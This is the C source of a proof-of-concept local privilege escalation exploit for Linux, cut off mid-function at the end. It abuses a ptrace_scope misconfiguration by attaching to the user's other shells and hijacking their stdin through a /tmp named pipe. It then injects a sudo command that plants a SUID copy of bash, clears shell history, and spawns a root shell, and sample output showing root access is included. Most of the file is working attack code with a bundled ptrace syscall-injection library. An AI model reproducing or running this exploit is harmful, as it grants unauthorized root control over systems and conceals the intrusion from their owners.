/*
v0.1 beta - mit license

David Reguera Garcia aka Dreg exploit without gdb dep (only for x86_64 systems), based in:

WARNING! this is a POC, the code is CRAP

https://www.exploit-db.com/exploits/46989
'ptrace_scope' misconfiguration Local Privilege Escalation
Authors: Marcelo Vazquez  (s4vitar)
 	 Victor Lasa       (vowkin)

Dreg contact:
dreg@fr33project.org
http://github.com/David-Reguera-Garcia-Dreg/
http://www.fr33project.org/

lib for ptrace:
https://github.com/emptymonkey/ptrace_do

-

Compile:

gcc -o xpk xpk.c
./xpk

WARNING!!: if you want use other exploit name you must change in this file:
#define XPL_PATH "./xpk

WARNING!!: if you have /tmp with nosuid or noexec you must change in this file:
#define TP_PATH "/tmp"
#define TP_PATH_BASH "/tmp/bash"

if the exploit dont works: 

try execute again ./xpk

check /proc/sys/kernel/yama/ptrace_scope:
dreg@fr33project:~$ cat /proc/sys/kernel/yama/ptrace_scope
0

WARNING!!: if you cancel the execution of the exploit you can break some terminals with the stdin hijacked

How to test:

open a terminal with a sudo user group 
execute any command with sudo and enter the password, ex: 

dreg@fr33project:~$ id
uid=1003(dreg) gid=1003(dreg) groups=1003(dreg),27(sudo)
dreg@fr33project:~$ sudo whoami
[sudo] password for dreg:
root

open other terminal with the same user and execute ./xpk

dreg@fr33project:~$ ./xpk
David Reguera Garcia aka Dreg exploit without gdb dep, based in:
https://www.exploit-db.com/exploits/46989
'ptrace_scope' misconfiguration Local Privilege Escalation
Authors: Marcelo Vazquez  (s4vitar)
         Victor Lasa       (vowkin)

[*] PID -> bash
[*] Path 2660: /home/dreg
stdin fd: 4
echo "clear && echo | sudo -S cp /bin/bash /tmp >/dev/null 2>&1 && echo | sudo -S chmod +s /tmp/bash >/dev/null 2>&1 | echo && history -c && clear" >> /tmp/crap
[*] PID -> bash
[*] Path 2892: /home/dreg
stdin fd: 4
echo "clear && echo | sudo -S cp /bin/bash /tmp >/dev/null 2>&1 && echo | sudo -S chmod +s /tmp/bash >/dev/null 2>&1 | echo && history -c && clear" >> /tmp/crap
[*] PID -> sh
[*] Path 2998: /home/dreg
stdin fd: 4
echo "clear && echo | sudo -S cp /bin/bash /tmp >/dev/null 2>&1 && echo | sudo -S chmod +s /tmp/bash >/dev/null 2>&1 | echo && history -c && clear" >> /tmp/crap
[*] PID -> bash
[*] Path 2999: /home/dreg
stdin fd: 4
echo "clear && echo | sudo -S cp /bin/bash /tmp >/dev/null 2>&1 && echo | sudo -S chmod +s /tmp/bash >/dev/null 2>&1 | echo && history -c && clear" >> /tmp/crap

[*] Cleaning up...
[*] Spawning root shell...
bash-5.0# id
uid=1003(dreg) gid=1003(dreg) euid=0(root) egid=0(root) groups=0(root),27(sudo),1003(dreg)
bash-5.0# whoami
root
bash-5.0#

*/

#define _GNU_SOURCE

#include <errno.h>
#include <stdio.h>
#include <string.h>
#include <stddef.h>


//#include "libptrace_do.h"

#define SHELL_PATH "/bin/bash"
#define TP_PATH "/tmp"
#define TP_PATH_BASH "/tmp/bash"
#define XPL_PATH "./xpk"
#define NA_PIPE_PATH "/tmp/crap"
#define SCRIPT_PATH "script.sh"
#define EXEC_SCRIPT_C "/bin/bash " SCRIPT_PATH
#define INJ_CD "echo \"echo | clear && echo | sudo -S cp " SHELL_PATH " " TP_PATH " >/dev/null 2>&1 && echo | sudo -S chmod +s " TP_PATH_BASH " >/dev/null 2>&1 | echo && history -c && clear\" >> " NA_PIPE_PATH 


#define _GNU_SOURCE

#include <errno.h>
#include <error.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <syscall.h>
#include <sys/mman.h>
#include <sys/param.h>
#include <sys/ptrace.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <unistd.h>



#define SYSCALL	0x050f
#define SYSCALL_MASK 0x000000000000ffff
#define SIZEOF_SYSCALL 2


#define LIBC_PATH "/lib/libc-"



/* Basic object for keeping state. */
struct ptrace_do{
	int pid;
	unsigned long sig_ignore;
	struct user_regs_struct saved_regs;

	struct parse_maps *map_head;	
	unsigned long syscall_address;

	struct mem_node *mem_head;
};

// Modes for specifying how to free a joint memory node.
#define FREE_LOCAL	0x01
#define FREE_REMOTE	0x10
#define FREE_BOTH		0x11

/* As needed, joint nodes of memory both local and remote. */
struct mem_node{
	void *local_address;
	unsigned long remote_address;
	size_t word_count;

	struct mem_node *next;
};


/* ptrace_do_init() hooks the target and prepares it to run our commands. */
struct ptrace_do *ptrace_do_init(int pid);

/* ptrace_do_malloc() allocates memory in the remote process for our use, without worry of upsetting the remote memory state. */
void *ptrace_do_malloc(struct ptrace_do *target, size_t size);

/* ptrace_do_free() frees a joint memory object. "operation" refers to the FREE_* modes above. */
void ptrace_do_free(struct ptrace_do *target, void *local_address, int operation);

/* ptrace_do_push_mem() and ptrace_do_pull_mem() synchronize the memory states between local and remote buffers. */ 
void *ptrace_do_push_mem(struct ptrace_do *target, void *local_address);
void *ptrace_do_pull_mem(struct ptrace_do *target, void *local_address);

/* Short helper function to translate your local address to the remote one. */
void *ptrace_do_get_remote_addr(struct ptrace_do *target, void *local_addr);

/* ptrace_do_sig_ignore() sets the signal mask for the remote process. */
/* This is simple enough, we only need a macro. */
/* Note, this is for *our* handling of remote signals. This won't persist once we detatch. */
#define ptrace_do_sig_ignore(TARGET, SIGNAL)	TARGET->sig_ignore |= 1<<SIGNAL

/* ptrace_do_syscall() will execute the given syscall inside the remote process. */
unsigned long ptrace_do_syscall(struct ptrace_do *target, unsigned long rax, \
		unsigned long rdi, unsigned long rsi, unsigned long rdx, unsigned long r10, unsigned long r8, unsigned long r9);

/* ptrace_do_cleanup() will detatch and do it's best to clean up the data structures. */
void ptrace_do_cleanup(struct ptrace_do *target);


/*
 * parse_maps 
 *
 * Added functionality to parse the /proc/PID/maps file of the target process into an internal data structure.
 * This allows us to walk areas of executable memory looking for a SYSCALL instruction to borrow.
 *
 * We leave the maps data structure accessible in the ptrace_do object, in case it comes in handy for the user.
 *
 * "man proc" for more information on the shape of the maps file.
 */

#define MAPS_READ			0x10000
#define MAPS_WRITE		0x01000
#define MAPS_EXECUTE	0x00100
#define MAPS_PRIVATE	0x00010
#define MAPS_SHARED		0x00001

/* Basic parse_maps object representing the different fields represented in the file. */
struct parse_maps {

	unsigned long start_address;
	unsigned long end_address;
	unsigned int perms;
	unsigned long offset;
	unsigned int dev_major;
	unsigned int dev_minor;
	unsigned long inode;
	char pathname[PATH_MAX];

	struct parse_maps *next;
	struct parse_maps *previous;
};

/* get_proc_pid_maps() processes the maps file and returns the created object.*/
struct parse_maps *get_proc_pid_maps(pid_t target);

/* free_parse_maps_list() destroys a parse_maps object chain. */
void free_parse_maps_list(struct parse_maps *head);

/* Mostly for debugging, but in case it comes in handy, this function prints the parse_maps object members. */
void dump_parse_maps_list(struct parse_maps *head);


unsigned char script[0x1000];

unsigned char* script_template = \
 "tput civis && pgrep \"^(echo $(cat /etc/shells | tr '/' ' ' | awk 'NF{print $NF}' | tr '\\n' '|'))$\" -u \"$(id -u)\" | sed '$ d' | while read shell_pid; do \n"
 "   if [ $(cat /proc/$shell_pid/comm 2>/dev/null) ] || [ $(pwdx $shell_pid 2>/dev/null) ]; then \n"
 "     echo \"[*] PID -> \"$(cat \"/proc/$shell_pid/comm\" 2>/dev/null) \n"
 "     echo \"[*] Path $(pwdx $shell_pid 2>/dev/null)\"  \n"
 "   fi; %s \"$shell_pid\" \n"
 "   done \n"
 "   if [ -f " TP_PATH_BASH " ]; then \n"
 "     " TP_PATH_BASH " -p -c 'echo -e \"\\n[*] Cleaning up...\" \n"
 "                             rm " TP_PATH_BASH " \n"
 "                      echo -e \"[*] Spawning root shell...\" \n"
 "                      tput cnorm && bash -p' \n"
 "   else \n"
 "     echo -e \"\\n[*] Could not copy SUID to " TP_PATH_BASH " \" \n"
 "   fi \n"
 "\n";


#define BUFF_SIZE	50

int main(int argc, char **argv){
char *buffer;
struct ptrace_do *target;
void *remote_addr;
int fd;
int fd_out;
int orig_stdin;
int orig_stdout;

mkfifo(NA_PIPE_PATH, 0777);

if (argc < 2)
{
	puts("David Reguera Garcia aka Dreg exploit without gdb dep, based in:\n"
"https://www.exploit-db.com/exploits/46989\n"
"'ptrace_scope' misconfiguration Local Privilege Escalation\n"
"Authors: Marcelo Vazquez  (s4vitar)\n"
" 	 Victor Lasa       (vowkin)\n");
	
	sprintf(script, script_template, XPL_PATH);

	FILE* script_file = fopen(SCRIPT_PATH, "wb");
	if (NULL != script_file)
	{
		fseek(script_file, 0L, SEEK_SET);
		fwrite(script, strlen(script), 1, script_file);
		fflush(script_file);
		fclose(script_file);

		system(EXEC_SCRIPT_C);
	}

}
else
{

	pid_t thepid = atoi(argv[1]);


/*
#define new_stdout "/dev/null"

	target = ptrace_do_init(thepid);

        buffer = (char *) ptrace_do_malloc(target, BUFF_SIZE);
        memset(buffer, 0, BUFF_SIZE);
        snprintf(buffer, BUFF_SIZE, new_stdout);
        remote_addr = ptrace_do_push_mem(target, buffer);
	fd_out = ptrace_do_syscall(target, __NR_open, remote_addr, O_RDWR, 0, 0, 0, 0);

	orig_stdout = ptrace_do_syscall(target, __NR_dup, 1, 0, 0, 0, 0, 0);
	printf("stdout fd: %d\n", orig_stdout);

	ptrace_do_syscall(target, __NR_dup2, fd_out, 1, 0, 0, 0, 0);

	ptrace_do_syscall(target, __NR_close, fd_out, 0, 0, 0, 0, 0);

	ptrace_do_cleanup(target);
*/

	target = ptrace_do_init(thepid);

	buffer = (char *) ptrace_do_malloc(target, BUFF_SIZE);
	memset(buffer, 0, BUFF_SIZE);
	snprintf(buffer, BUFF_SIZE, NA_PIPE_PATH);
	remote_addr = ptrace_do_push_mem(target, buffer);
	fd = ptrace_do_syscall(target, __NR_open, remote_addr, O_RDWR, 0, 0, 0, 0);

	orig_stdin = ptrace_do_syscall(target, __NR_dup, 0, 0, 0, 0, 0, 0);
	printf("stdin fd: %d\n", orig_stdin);

	ptrace_do_syscall(target, __NR_dup2, fd, 0, 0, 0, 0, 0);

	ptrace_do_syscall(target, __NR_close, fd, 0, 0, 0, 0, 0);

	ptrace_do_cleanup(target);

	system("timeout 2 cat " NA_PIPE_PATH);
        puts(INJ_CD);
        system(INJ_CD);
        system(INJ_CD);
        sleep(2);
        target = ptrace_do_init(thepid);

	ptrace_do_syscall(target, __NR_dup2, orig_stdin, 0, 0, 0, 0, 0);

//	ptrace_do_syscall(target, __NR_dup2, orig_stdout, 1, 0, 0, 0, 0);

	ptrace_do_cleanup(target);


}

return 1;

if (argc > 2)
{
	ptrace_do_syscall(target, __NR_dup2, atoi(argv[2]), 0, 0, 0, 0, 0);
}
else
{
}
//ptrace_do_syscall(target, __NR_close, fd, 0, 0, 0, 0, 0);


return 0;

/*
typedef struct drgs {
	char* argv[3];
	char* envp[2];

	char shell_path[255];
	char shell_args[255];
	char env[255];
	char null_data[100];
} drgs_t;


	int retval = 0;
	int pid = 0;
	void *tmp_addr = NULL;
	struct ptrace_do *target = NULL;
	unsigned long rem_file_name_addr = 0;
	unsigned long rem_argv_addr =  0;
	unsigned long rem_envp_addr = 0;

	if(argc != 2){
		fprintf(stderr, "usage: %s PID\n", program_invocation_short_name);
		exit(-1);
	}

	retval = strtol(argv[1], NULL, 10);
	if(errno || !retval){
		fprintf(stderr, "usage: %s PID\n", program_invocation_short_name);
		exit(-1);
	}
	pid = retval;

	target = ptrace_do_init(pid);

        drgs_t* drg = (drgs_t*)  ptrace_do_malloc(target, sizeof(*drg));
	memset(drg, 0, sizeof(*drg));

	tmp_addr = ptrace_do_get_remote_addr(target, drg);
	printf("addr : %p\n", tmp_addr);

	strcpy(drg->shell_path, "/bin/bash");
	strcpy(drg->shell_args, "-x ");
        drg->argv[0] = (char*)((unsigned long long)tmp_addr) + offsetof(struct drgs, shell_path);
        drg->argv[1] = (char*)((unsigned long long)tmp_addr) + offsetof(struct drgs, shell_args);
        drg->argv[2] = NULL;
        drg->envp[0] = NULL;
        drg->envp[1] = NULL;

	ptrace_do_push_mem(target, drg);

	rem_file_name_addr = ((unsigned long long)tmp_addr) + offsetof(struct drgs, shell_path);
        rem_argv_addr =  ((unsigned long long)tmp_addr) + offsetof(struct drgs, argv);
        rem_envp_addr = ((unsigned long long)tmp_addr) + offsetof(struct drgs, envp);

	ptrace_do_syscall(target, __NR_execve,
		rem_file_name_addr,
		rem_argv_addr,
		rem_envp_addr,
		0, 0, 0
		);


	ptrace_do_cleanup(target);


	return(0);
*/
}

/**********************************************************************
 *
 *	libptrace_do : 2012-12-24
 *		emptymonkey's ptrace library for easy syscall injection.
 *
 *
 *	Example use, injecting open / dup2 / close calls to hijack stdin / stdout / stderr:
 *
 *		char *buffer;
 *		struct ptrace_do *target;
 *		void *remote_addr;
 *		int fd;
 *     
 *		target = ptrace_do_init(PID);
 *		buffer = (char *) ptrace_do_malloc(target, BUFF_SIZE);
 *		memset(buffer, 0, BUFF_SIZE);
 *		snprintf(buffer, BUFF_SIZE, "/dev/pts/4");
 *		remote_addr = ptrace_do_push_mem(target, buffer);
 *		fd = ptrace_do_syscall(target, __NR_open, remote_addr, O_RDWR, 0, 0, 0, 0);
 *		ptrace_do_syscall(target, __NR_dup2, fd, 0, 0, 0, 0, 0);
 *		ptrace_do_syscall(target, __NR_dup2, fd, 1, 0, 0, 0, 0);
 *		ptrace_do_syscall(target, __NR_dup2, fd, 2, 0, 0, 0, 0);
 *		ptrace_do_syscall(target, __NR_close, fd, 0, 0, 0, 0, 0);
 *		ptrace_do_cleanup(target);
 *
 **********************************************************************/

//#include "libptrace_do.h"


/**********************************************************************
 *
 *	struct ptrace_do *ptrace_do_init(int pid)
 *
 *		Input:
 *			The process id of the target.
 *
 *		Output:
 *			Pointer to a struct ptrace_do object. NULL on error.
 *
 *		Purpose:
 *			Initialize the session. Attach to the process and save its
 *			register state (for later restoration).
 *	
 **********************************************************************/
struct ptrace_do *ptrace_do_init(int pid){
	int retval, status;
	unsigned long peekdata;
	unsigned long i;
	struct ptrace_do *target;
	siginfo_t siginfo;

	struct parse_maps *map_current;


	if((target = (struct ptrace_do *) malloc(sizeof(struct ptrace_do))) == NULL){
		fprintf(stderr, "%s: malloc(%d): %s\n", program_invocation_short_name, \
				(int) sizeof(struct ptrace_do), strerror(errno));
		return(NULL);
	}
	memset(target, 0, sizeof(struct ptrace_do));
	target->pid = pid;


	// Here we test to see if the child is already attached. This may be the case if the child
	// is a willing accomplice, aka PTRACE_TRACEME.
	// We are testing if it is already traced by trying to read data, specifically its last 
	// signal received. If PTRACE_GETSIGINFO is succesfull *and* the last signal recieved was 
	// SIGTRAP, then it's prolly safe to assume this is the PTRACE_TRACEME case.

	memset(&siginfo, 0, sizeof(siginfo));
	if(ptrace(PTRACE_GETSIGINFO, target->pid, NULL, &siginfo)){

		if((retval = ptrace(PTRACE_ATTACH, target->pid, NULL, NULL)) == -1){
			fprintf(stderr, "%s: ptrace(%d, %d, %lx, %lx): %s\n", program_invocation_short_name, \
					(int) PTRACE_ATTACH, (int) target->pid, (long unsigned int) NULL, \
					(long unsigned int) NULL, strerror(errno));
			free(target);
			return(NULL);
		}

		if((retval = waitpid(target->pid, &status, 0)) < 1){
			fprintf(stderr, "%s: waitpid(%d, %lx, 0): %s\n", program_invocation_short_name, \
					(int) target->pid, (unsigned long) &status, strerror(errno));
			free(target);
			return(NULL);
		}

		if(!WIFSTOPPED(status)){
			free(target);
			return(NULL);
		}
	}else{
		if(siginfo.si_signo != SIGTRAP){
			fprintf(stderr, "%s: ptrace(%d, %d, %lx, %lx): Success, but not recently trapped. Aborting!\n", program_invocation_short_name, \
					(int) PTRACE_GETSIGINFO, (int) target->pid, (long unsigned int) NULL, \
					(long unsigned int) &siginfo);
			free(target);
			return(NULL);
		}
	}

	if((retval = ptrace(PTRACE_GETREGS, target->pid, NULL, &(target->saved_regs))) == -1){
		fprintf(stderr, "%s: ptrace(%d, %d, %lx, %lx): %s\n", program_invocation_short_name, \
				(int) PTRACE_GETREGS, (int) target->pid, (long unsigned int) NULL, \
				(long unsigned int) &(target->saved_regs), strerror(errno));
		free(target);
		return(NULL);
	}

	// The tactic for performing syscall injection is to fill the registers to the appropriate values for your syscall,
	// then point $rip at a piece of executable memory that contains the SYSCALL instruction.

	// If we came in from a PTRACE_ATTACH call, then it's likely we are on a syscall edge, and can save time by just
	// using the one SIZEOF_SYSCALL addresses behind where we are right now.
	errno = 0;
	peekdata = ptrace(PTRACE_PEEKTEXT, target->pid, (target->saved_regs).rip - SIZEOF_SYSCALL, NULL);

	if(!errno && ((SYSCALL_MASK & peekdata) == SYSCALL)){
		target->syscall_address = (target->saved_regs).rip - SIZEOF_SYSCALL;

	// Otherwise, we will need to start stepping through the various regions of executable memory looking for 
	// a SYSCALL instruction.
	}else{
		if((target->map_head = get_proc_pid_maps(target->pid)) == NULL){
			fprintf(stderr, "%s: get_proc_pid_maps(%d): %s\n", program_invocation_short_name, \
					(int) target->pid, strerror(errno));
			free(target);
			return(NULL);
		}

		map_current = target->map_head;
		while(map_current){

			if(target->syscall_address){
				break;
			}

			if((map_current->perms & MAPS_EXECUTE)){

				for(i = map_current->start_address; i < (map_current->end_address - sizeof(i)); i++){
					errno = 0;
					peekdata = ptrace(PTRACE_PEEKTEXT, target->pid, i, NULL);
					if(errno){
						fprintf(stderr, "%s: ptrace(%d, %d, %lx, %lx): %s\n", program_invocation_short_name, \
								(int) PTRACE_PEEKTEXT, (int) target->pid, i, \
								(long unsigned int) NULL, strerror(errno));
						free(target);
						free_parse_maps_list(target->map_head);
						return(NULL);
					}

					if((SYSCALL_MASK & peekdata) == SYSCALL){
						target->syscall_address = i;
						break;
					}
				}
			}

			map_current = map_current->next;
		}
	}
	return(target);
}


/**********************************************************************
 *
 *	void *ptrace_do_malloc(struct ptrace_do *target, size_t size)
 *
 *		Input:
 *			This sessions ptrace_do object.
 *			The desired size for the users local buffer.
 *
 *		Output:
 *			A pointer to the local storage space. NULL on error.
 *
 *		Purpose:
 *			Reserve a chunk of memory of the given 'size' in both the local
 *			and remote processes, and link them together inside of this 
 *			sessions ptrace_do object. This gives the local code a place
 *			in the remote process to save data for various purposes.
 *			(e.g. the file path needed for an open() syscall).
 *
 *		Note: 
 *			Multiple calls to ptrace_do_malloc will make multiple calls to
 *			mmap in the remote context. This should be fine and will
 *			usually be arranged as page aligned sequential chunks by the
 *			OS.
 *
 **********************************************************************/
void *ptrace_do_malloc(struct ptrace_do *target, size_t size){

	struct mem_node *new_mem_node, *last_mem_node;


	if(!size){
		return(NULL);
	}

	last_mem_node = target->mem_head;
	if(last_mem_node){
		while(last_mem_node->next){
			last_mem_node = last_mem_node->next;
		}
	}

	while(size % sizeof(long)){
		size++;
	}

	if((new_mem_node = (struct mem_node *) malloc(sizeof(struct mem_node))) == NULL){
		fprintf(stderr, "%s: malloc(%d): %s\n", program_invocation_short_name, \
				(int) sizeof(struct mem_node), strerror(errno));
		return(NULL);
	}
	memset(new_mem_node, 0, sizeof(struct mem_node));

	if((new_mem_node->local_address = malloc(size)) == NULL){
		fprintf(stderr, "%s: malloc(%d): %s\n", program_invocation_short_name, \
				(int) size, strerror(errno));
		free(new_mem_node);
		return(NULL);
	}
	new_mem_node->word_count = (size / sizeof(long));

	if((long) (new_mem_node->remote_address = ptrace_do_syscall(target, \
					__NR_mmap, (unsigned long) NULL, size, \
					PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)) < 0){
		fprintf(stderr, "%s: ptrace_do_syscall(%lx, %lx, %lx, %lx, %lx, %lx, %lx, %lx): %s\n", \
				program_invocation_short_name, (unsigned long) target, \
				(unsigned long) __NR_mmap, (unsigned long) NULL, (unsigned long) size, \
				(unsigned long) (PROT_READ|PROT_WRITE), (unsigned long) (MAP_PRIVATE|MAP_ANONYMOUS), \
				(unsigned long) -1, (unsigned long) 0, strerror(-new_mem_node->remote_address));
		free(new_mem_node->local_address);
		free(new_mem_node);
		return(NULL);
	}	

	if(last_mem_node){
		last_mem_node->next = new_mem_node;
	}else{
		target->mem_head = new_mem_node;
	}

	return(new_mem_node->local_address);
}


/**********************************************************************
 *
 *	void *ptrace_do_push_mem(struct ptrace_do *target, void *local_address)
 *
 *		Input:
 *			This sessions ptrace_do object.
 *			A reference to a local buffer that was created with ptrace_do_malloc().
 *
 *		Output:
 *			A pointer to the buffer in the remote process. (Presumably for
 *			use in a later syscall). NULL on error.
 *
 *		Purpose:
 *			Copies the data in the local_address buffer to the buffer in
 *			the remote process to which it is linked. Upon return you 
 *			have an address to hand a remote syscall. 
 *
 **********************************************************************/
void *ptrace_do_push_mem(struct ptrace_do *target, void *local_address){

	int retval, i; 
	unsigned long ptrace_data;
	struct mem_node *node;


	node = target->mem_head;
	if(node){
		while(node->next && node->local_address != local_address){
			node = node->next;
		}
	}

	if(!(node && (node->local_address == local_address))){
		fprintf(stderr, "%s: ptrace_do_pull_mem(%lx, %lx): No matching address location\n", 
				program_invocation_short_name, (unsigned long) target, (unsigned long) local_address);
		return(NULL);
	}

	memset(&ptrace_data, 0, sizeof(ptrace_data));
	for(i = 0; i < (int) node->word_count; i++){
		memcpy(&ptrace_data, &(((char *) local_address)[i * sizeof(long)]), sizeof(long));

		if((retval = ptrace(PTRACE_POKETEXT, target->pid, \
						(void *) (node->remote_address + (i * sizeof(long))), (void *) ptrace_data)) == -1){
			fprintf(stderr, "%s: ptrace(%d, %d, %lx, %lx): %s\n", program_invocation_short_name, \
					(int) PTRACE_POKETEXT, (int) target->pid, \
					(long unsigned int) (node->remote_address + (i * sizeof(long))), \
					(long unsigned int) ptrace_data, strerror(errno));
			return(NULL);
		}
	}

	return((void *) node->remote_address);
}


/**********************************************************************
 *
 *	void *ptrace_do_pull_mem(struct ptrace_do *target, void *local_address)
 *
 *		Input:
 *			This sessions ptrace_do object.
 *			A reference to a local buffer that was created with ptrace_do_malloc().
 *
 *		Output:
 *			A pointer to the buffer in the remote process. (Presumably for
 *			use in a later syscall). NULL on error.
 *
 *		Purpose:
 *			Copies the data in the remote process buffer to the buffer in
 *			local_address to which it is linked.
 *
 **********************************************************************/
void *ptrace_do_pull_mem(struct ptrace_do *target, void *local_address){

	int i; 

	unsigned long ptrace_data;
	struct mem_node *node;

	node = target->mem_head;
	if(node){
		while(node->next && node->local_address != local_address){
			node = node->next;
		}
	}

	if(!(node && (node->local_address == local_address))){
		fprintf(stderr, "%s: ptrace_do_pull_mem(%lx, %lx): No matching address location\n", 
				program_invocation_short_name, (unsigned long) target, (unsigned long) local_address);
		return(NULL);
	}

	memset(&ptrace_data, 0, sizeof(ptrace_data));
	for(i = 0; i < (int) node->word_count; i++){

		errno = 0;
		ptrace_data = ptrace(PTRACE_PEEKTEXT, target->pid, \
				(void *) (node->remote_address + (i * sizeof(long))), NULL);
		if(errno){
			fprintf(stderr, "%s: ptrace(%d, %d, %lx, NULL): %s\n", program_invocation_short_name, \
					(int) PTRACE_PEEKTEXT, (int) target->pid, \
					(long unsigned int) (node->remote_address + (i * sizeof(long))), strerror(errno)); 
			return(NULL);
		}
		memcpy(&(((char *) local_address)[i * sizeof(long)]), &ptrace_data, sizeof(long));
	}

	return((void *) node->remote_address);
}

/**********************************************************************
 *	 
 * void *ptrace_do_get_remote_addr(struct ptrace_do *target, void *local_address) 
 *	 
 *	Input:  
 *		This sessions ptrace_do object. 
 *		A local memory address as returned by ptrace_do_malloc().
 *	 
 *	Output:
 *		The remote memory address associated with the local address.
 *		NULL will be returned on error (i.e. no matching address).
 * 
 **********************************************************************/
void *ptrace_do_get_remote_addr(struct ptrace_do *target, void *local_address){
	struct mem_node *node;

	node = target->mem_head;
	if(node){
		while(node->next && node->local_address != local_address){
			node = node->next;
		}
	}

	if(!(node && (node->local_address == local_address))){
		fprintf(stderr, "%s: ptrace_do_pull_mem(%lx, %lx): No matching address location\n",
				program_invocation_short_name, (unsigned long) target, (unsigned long) local_address);
		return(NULL);
	}

	return((void *) node->remote_address);
}


/**********************************************************************
 *	 
 *	unsigned long ptrace_do_syscall(struct ptrace_do *target, \
 *		unsigned long rax, unsigned long rdi, unsigned long rsi, \
 *		unsigned long rdx, unsigned long r10, unsigned long r8, unsigned long r9)
 *
 *		Input:
 *			This sessions ptrace_do object.
 *			The registers as you would want to set them for a syscall.
 *				(Registers that are not needed should be set to 0.)
 *
 *		Output:
 *			The results of the syscall will be returned (as we recieved it 
 *			back from rax.)
 *			On error, errno will be set appropriately.
 * 
 *		Purpose:
 *			Set up and execute a syscall within the remote process.
 *
 *		Example code for running "exit(42);" in the remote process:
 *
 *			#include <syscall.h>
 *				...
 *			struct ptrace_do *my_target;			
 *			unsigned long my_rax;
 *				...
 *			my_rax = ptrace_do_syscall(my_target, _NR_exit, 42, 0, 0, 0, 0, 0);
 *
 **********************************************************************/
unsigned long ptrace_do_syscall(struct ptrace_do *target, unsigned long rax, \
		unsigned long rdi, unsigned long rsi, unsigned long rdx, \
		unsigned long r10, unsigned long r8, unsigned long r9){

	int retval, status, sig_remember = 0;
	struct user_regs_struct attack_regs;


	/*
	 * There are two possible failure modes when calling ptrace_do_syscall():
	 *	
	 * 	1) ptrace_do_syscall() fails. In this case we should return -1 
	 *		and leave errno untouched (as it should be properly set when
	 *		the error occurs).
	 *	
	 *	or	
	 *	
	 * 	2) ptrace_do_syscall() is fine, but the remote syscall fails. 
	 *		In this case, we can't analyze the error without being intrusive,
	 *		so we will leave that job to the calling code. We should return the 
	 *		syscall results as it was passed to us in rax, but that may 
	 * 		legitimately be less than 0. As such we should zero out errno to ensure
	 *		the failure mode we are in is clear.
	 */
	errno = 0;

	memcpy(&attack_regs, &(target->saved_regs), sizeof(attack_regs));

	attack_regs.rax = rax;
	attack_regs.rdi = rdi;
	attack_regs.rsi = rsi;
	attack_regs.rdx = rdx;
	attack_regs.r10 = r10;
	attack_regs.r8 = r8;
	attack_regs.r9 = r9;

	attack_regs.rip = target->syscall_address;

	if((retval = ptrace(PTRACE_SETREGS, target->pid, NULL, &attack_regs)) == -1){
		fprintf(stderr, "%s: ptrace(%d, %d, %lx, %lx): %s\n", program_invocation_short_name, \
				(int) PTRACE_SETREGS, (int) target->pid, (long unsigned int) NULL, \
				(long unsigned int) &attack_regs, strerror(errno));
		return(-1);
	}

RETRY:
	status = 0;
	if((retval = ptrace(PTRACE_SINGLESTEP, target->pid, NULL, NULL)) == -1){
		fprintf(stderr, "%s: ptrace(%d, %d, %lx, %lx): %s\n", program_invocation_short_name, \
				(int) PTRACE_SINGLESTEP, (int) target->pid, (long unsigned int) NULL, \
				(long unsigned int) NULL, strerror(errno));
		return(-1);
	}

	if((retval = waitpid(target->pid, &status, 0)) < 1){
		fprintf(stderr, "%s: waitpid(%d, %lx, 0): %s\n", program_invocation_short_name, \
				(int) target->pid, (unsigned long) &status, strerror(errno));
		return(-1);
	}

	if(status){
		if(WIFEXITED(status)){
			errno = ECHILD;
			fprintf(stderr, "%s: waitpid(%d, %lx, 0): WIFEXITED(%d)\n", program_invocation_short_name, \
					target->pid, (unsigned long) &status, status);
			return(-1);
		}
		if(WIFSIGNALED(status)){
			errno = ECHILD;
			fprintf(stderr, "%s: waitpid(%d, %lx, 0): WIFSIGNALED(%d): WTERMSIG(%d): %d\n", \
					program_invocation_short_name, target->pid, (unsigned long) &status, \
					status, status, WTERMSIG(status));
			return(-1);
		}
		if(WIFSTOPPED(status)){

			if(target->sig_ignore & 1<<WSTOPSIG(status)){
				goto RETRY;
			}else if(WSTOPSIG(status) != SIGTRAP){
				sig_remember = status;
				goto RETRY;
			}
		}
		if(WIFCONTINUED(status)){
			errno = EINTR;
			fprintf(stderr, "%s: waitpid(%d, %lx, 0): WIFCONTINUED(%d)\n", program_invocation_short_name, \
					target->pid, (unsigned long) &status, status);
			return(-1);
		}
	}

	if((retval = ptrace(PTRACE_GETREGS, target->pid, NULL, &attack_regs)) == -1){
		fprintf(stderr, "%s: ptrace(%d, %d, %lx, %lx): %s\n", program_invocation_short_name, \
				(int) PTRACE_GETREGS, (int) target->pid, (long unsigned int) NULL, \
				(long unsigned int) &attack_regs, strerror(errno));
		return(-1);
	}

	// Re-deliver any signals we caught and ignored.
	if(sig_remember){
		// Not checking for errors here. This is a best effort to deliver the previous signal state.
		kill(target->pid, sig_remember);
	}

	// Let's reset this to what it was upon entry.
	if((retval = ptrace(PTRACE_SETREGS, target->pid, NULL, &(target->saved_regs))) == -1){
		fprintf(stderr, "%s: ptrace(%d, %d, %lx, %lx): %s\n", program_invocation_short_name, \
				(int) PTRACE_SETREGS, (int) target->pid, (long unsigned int) NULL, \
				(long unsigned int) &(target->saved_regs), strerror(errno));
		return(-1);
	}

	// Made it this far. Sounds like the ptrace_do_syscall() was fine. :)
	errno = 0;
	return(attack_regs.rax);
}


/**********************************************************************
 *
 *	void ptrace_do_cleanup(struct ptrace_do *target)
 *
 *		Input:
 *			This sessions ptrace_do object.
 *
 *		Output:
 *			None.
 *
 *		Purpose:
 *			Restore the registers of the target process. Free remote 
 *			memory buffers. Destroy and free the local objects.
 *			Detach from the process and let it resume.
 *
 *			Note: It is intended that this function is safe to call when 
 *			attempting to gracefully disengage the target process after
 *			encountering errors.
 *
 **********************************************************************/
void ptrace_do_cleanup(struct ptrace_do *target){

	int retval;
	struct mem_node *this_node, *previous_node;


	this_node = target->mem_head;
	while(this_node){

		if((retval = (int) ptrace_do_syscall(target, \
						__NR_munmap, this_node->remote_address, this_node->word_count * sizeof(long), \
						0, 0, 0, 0)) < 0){
			fprintf(stderr, "%s: ptrace_do_syscall(%lx, %d, %lx, %d, %d, %d, %d, %d): %s\n", \
					program_invocation_short_name, \
					(unsigned long) target, __NR_munmap, this_node->remote_address, \
